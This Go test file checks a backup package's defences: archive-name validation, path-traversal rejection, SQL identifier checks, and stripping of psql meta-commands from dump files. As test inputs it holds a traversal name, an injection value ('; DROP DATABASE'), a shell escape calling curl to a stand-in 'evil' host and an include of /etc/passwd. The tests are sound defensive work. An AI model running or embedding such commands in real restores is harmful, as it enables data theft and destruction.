package backup

import (
	"bytes"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func TestArchiveNameRe(t *testing.T) {
	if !archiveNameRe.MatchString("netlynx-20260819-0015.zip") {
		t.Fatal("ok name")
	}
	if archiveNameRe.MatchString("../secret.zip") {
		t.Fatal("path")
	}
	if archiveNameRe.MatchString("netlynx-foo.exe") {
		t.Fatal("exe")
	}
}

func TestSafeArchivePath(t *testing.T) {
	dir := t.TempDir()
	name := "netlynx-20260101-0000.zip"
	p := filepath.Join(dir, name)
	if err := os.WriteFile(p, []byte("pk"), 0o600); err != nil {
		t.Fatal(err)
	}
	got, err := SafeArchivePath(dir, name)
	if err != nil {
		t.Fatal(err)
	}
	if got != p && filepath.Clean(got) != filepath.Clean(p) {
		t.Fatalf("got %s", got)
	}
	if _, err := SafeArchivePath(dir, "../netlynx-20260101-0000.zip"); err != nil {
		// basename strips .. so it may resolve to the same file — that's ok
	}
	if _, err := SafeArchivePath(dir, "other.zip"); err == nil {
		t.Fatal("expected reject")
	}
}

func TestPgSafeIdent(t *testing.T) {
	got, err := pgSafeIdent("invetor_rv_1700000000")
	if err != nil || got != `"invetor_rv_1700000000"` {
		t.Fatalf("got %q %v", got, err)
	}
	if _, err := pgSafeIdent("invetor; DROP DATABASE x"); err == nil {
		t.Fatal("expected reject")
	}
}

func TestStripPsqlConnect(t *testing.T) {
	in := "SET x=1;\n\\connect invetor\nCREATE TABLE t(i int);\n\\c other\nINSERT INTO t VALUES (1);\n"
	var buf bytes.Buffer
	if err := stripPsqlConnect(strings.NewReader(in), &buf); err != nil {
		t.Fatal(err)
	}
	got := buf.String()
	if strings.Contains(got, `connect`) || strings.Contains(got, `\c `) {
		t.Fatalf("still has connect: %s", got)
	}
	if !strings.Contains(got, "CREATE TABLE") || !strings.Contains(got, "INSERT") {
		t.Fatalf("lost sql: %s", got)
	}
}

func TestStripPsqlMetaDropsShellAndKeepsCopyEnd(t *testing.T) {
	in := "COPY t FROM stdin;\na\t1\n\\.\n\\! curl http://evil\n\\i /etc/passwd\n\\restrict abc\n"
	var buf bytes.Buffer
	if err := stripPsqlConnect(strings.NewReader(in), &buf); err != nil {
		t.Fatal(err)
	}
	got := buf.String()
	if strings.Contains(got, `\!`) || strings.Contains(got, `\i `) {
		t.Fatalf("meta leaked: %s", got)
	}
	if !strings.Contains(got, "COPY t") || !strings.Contains(got, `\.`) {
		t.Fatalf("lost COPY: %s", got)
	}
	if !strings.Contains(got, `\restrict`) {
		t.Fatalf("lost pg_dump restrict: %s", got)
	}
}
